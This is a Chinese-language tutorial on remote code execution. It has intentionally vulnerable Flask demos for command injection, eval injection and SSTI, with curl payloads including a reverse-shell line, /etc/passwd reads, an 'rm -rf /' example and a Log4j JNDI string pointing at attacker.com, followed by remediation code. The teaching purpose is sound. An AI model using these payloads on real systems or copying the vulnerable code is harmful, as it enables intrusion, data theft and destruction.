# RCE 远程代码执行（Remote Code Execution）

> **一句话定义**：攻击者利用漏洞在目标服务器上执行任意操作系统命令或代码，完全控制服务器。

**危险等级**：🔴 严重（最高危漏洞）

---

## 原理深度分析

### 为什么发生

RCE 的根源是**应用程序将用户输入传递给了执行系统命令或代码的函数，而没有进行严格的过滤**。

```python
# 常见的 RCE 触发函数
os.system(cmd)           # 执行系统命令
os.popen(cmd)            # 执行系统命令
subprocess.call(cmd, shell=True)  # shell=True 是关键
eval(code)               # 执行 Python 表达式
exec(code)               # 执行 Python 代码
pickle.loads(data)       # 反序列化执行任意代码
```

### 常见触发场景

| 场景 | 示例 | 风险函数 |
|------|------|----------|
| 命令执行 | `ping 127.0.0.1; rm -rf /` | `os.system()` |
| 代码注入 | `eval('1+1')` 变成 `eval('__import__("os").system("id")')` | `eval()`, `exec()` |
| 模板注入 | Jinja2 模板中包含用户输入 | `render_template_string()` |
| 不安全反序列化 | Pickle/Java 反序列化 | `pickle.loads()` |

---

## 真实世界案例

### 案例 1：Equifax 数据泄露（2017）

**1.47 亿**用户数据泄露，源于 Apache Struts 的 RCE 漏洞（CVE-2017-5638）。

- **攻击方式**：攻击者利用 Struts2 的 OGNL 注入 RCE
- **利用链**：恶意 Content-Type 头 → OGNL 表达式解析 → 命令执行
- **后果**：Equifax 支付了 **5.75 亿美元**罚款的和解费
- **教训**：框架漏洞的补丁必须在 24 小时内更新

### 案例 2：Log4j 核弹级漏洞（2021, CVE-2021-44228）

Log4j2 的 JNDI 注入 RCE 漏洞，被称为"互联网核弹"。

- **攻击方式**：在日志消息中嵌入 `${jndi:ldap://attacker.com/a}`
- **影响**：全球数百万应用受影响
- **后果**：CVSS 评分 10.0（满分），所有 Java 应用紧急修补
- **教训**：日志框架不应该解析用户输入中的 JNDI 查找

---

## 简单 POC

### 场景 1：命令注入

```python
# app.py — 有 RCE 漏洞的 Ping 工具
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    
    # 🔴 漏洞：shell=True 允许命令拼接
    result = os.popen(f'ping -n 1 {host}').read()
    return f"<pre>{result}</pre>"

if __name__ == '__main__':
    app.run(port=5004)
```

```bash
# 正常使用
curl "http://localhost:5004/ping?host=127.0.0.1"

# RCE — 通过命令分隔符注入
curl "http://localhost:5004/ping?host=127.0.0.1%20%26%26%20whoami"
curl "http://localhost:5004/ping?host=127.0.0.1|whoami"
curl "http://localhost:5004/ping?host=127.0.0.1%3B%20whoami"  # ; 分隔

# 反弹 Shell
curl "http://localhost:5004/ping?host=127.0.0.1%20%26%20powershell%20-enc%20BASE64_PAYLOAD"

# 读取敏感文件
curl "http://localhost:5004/ping?host=127.0.0.1%20%26%26%20type%20C:%5CWindows%5Cwin.ini"
```

### 场景 2：Python Eval 注入

```python
# app.py — Eval 注入演示
from flask import Flask, request

app = Flask(__name__)

@app.route('/calc')
def calc():
    expr = request.args.get('expr', '0')
    
    # 🔴 高危：永远不要用 eval 处理用户输入
    try:
        result = eval(expr)
        return f"{expr} = {result}"
    except Exception as e:
        return f"错误: {e}"

if __name__ == '__main__':
    app.run(port=5005)
```

```bash
# 正常使用
curl "http://localhost:5005/calc?expr=2%2B2"
# 返回：2+2 = 4

# Eval 注入 — 获取系统信息
curl "http://localhost:5005/calc?expr=__import__('os').system('whoami')"

# 读取文件
curl "http://localhost:5005/calc?expr=open('/etc/passwd').read()"

# 使用字符串（注意编码）
curl "http://localhost:5005/calc?expr=__import__('os').popen('dir').read()"
```

### 场景 3：模板注入（SSTI）

```python
# app.py — Jinja2 模板注入
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    
    # 🔴 漏洞：动态渲染用户输入的模板
    template = Template(f"Hello, {name}!")
    return template.render()

if __name__ == '__main__':
    app.run(port=5006)
```

```bash
# 正常使用
curl "http://localhost:5006/greet?name=Alice"
# 返回：Hello, Alice!

# SSTI — Jinja2 模板注入
curl "http://localhost:5006/greet?name={{7*7}}"
# 返回：Hello, 49!

# 获取配置
curl "http://localhost:5006/greet?name={{config}}"

# RCE 通过 SSTI
curl -G "http://localhost:5006/greet" --data-urlencode "name={{''.__class__.__mro__[2].__subclasses__()}}"
```

---

## 修复方案

### 方案 1：避免使用执行函数 ⭐⭐⭐⭐⭐

```python
# 🔴 不要这样
os.system(f'ping -n 1 {host}')
os.popen(f'nslookup {domain}')

# ✅ 使用非 shell 方式执行命令
import subprocess

def safe_ping(host):
    # 验证输入
    import re
    if not re.match(r'^[\w\.-]+$', host):
        raise ValueError("无效的主机名")
    
    # 使用列表参数，不需要 shell
    result = subprocess.run(
        ['ping', '-n', '1', host],
        capture_output=True,
        text=True,
        timeout=10
    )
    return result.stdout
```

### 方案 2：严格输入验证 ⭐⭐⭐⭐

```python
import re
from ipaddress import ip_address

def validate_host(host):
    """严格的输入验证"""
    # 只允许合法域名和 IP
    if not re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', host):
        # 尝试 IP 地址
        try:
            ip_address(host)
        except ValueError:
            return False
    return True
```

### 方案 3：使用专用库 ⭐⭐⭐⭐

```python
# 代替自己执行 ping，使用专门的网络库
import ping3

result = ping3.ping(host)
# 而不是 os.system(f"ping {host}")

# 代替 os.system("nslookup ...")
import socket
result = socket.gethostbyname(domain)
```

### 方案 4：沙箱隔离 ⭐⭐⭐

```python
# Python eval 的替代方案 — 使用限制表达式
import ast

def safe_eval(expr):
    """安全的数学表达式求值"""
    allowed_ops = (ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Pow, 
                   ast.USub, ast.UAdd, ast.Num, ast.Constant)
    
    tree = ast.parse(expr, mode='eval')
    
    for node in ast.walk(tree):
        if type(node) not in allowed_ops:
            raise ValueError(f"不允许的操作: {type(node)}")
    
    return eval(compile(tree, '<string>', 'eval'), {'__builtins__': {}})
```

### 方案 5：最小化 Shell 使用 ⭐⭐⭐⭐⭐

```python
# 通用原则：永远不要使用 shell=True
# 永远使用参数列表形式

# 🔴 危险
subprocess.call(f'cp "{src}" "{dst}"', shell=True)
subprocess.call(f'nslookup {domain}', shell=True)

# ✅ 安全 — 参数列表形式避免注入
subprocess.call(['cp', src, dst])
subprocess.call(['nslookup', domain])
```

---

## 检测与防御工具

| 工具 | 用途 |
|------|------|
| [Semgrep](https://semgrep.dev/) | 静态代码扫描，检测危险函数调用 |
| [Bandit](https://github.com/PyCQA/bandit) | Python 安全 linter，检测 eval/os.system 等 |
| [RIPS](https://www.ripstech.com/) | PHP 静态代码分析 |
| [CodeQL](https://codeql.github.com/) | GitHub 的代码安全分析引擎 |

---

## 延伸阅读

1. [OWASP Command Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
2. [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
3. [Jinja2 SSTI 指南](https://portswigger.net/research/server-side-template-injection)
4. [CVE-2021-44228 Log4j 漏洞分析](https://www.lunasec.io/docs/blog/log4j-zero-day/)
5. [CVE-2017-5638 Struts2 漏洞分析](https://cwiki.apache.org/confluence/display/WW/S2-045)
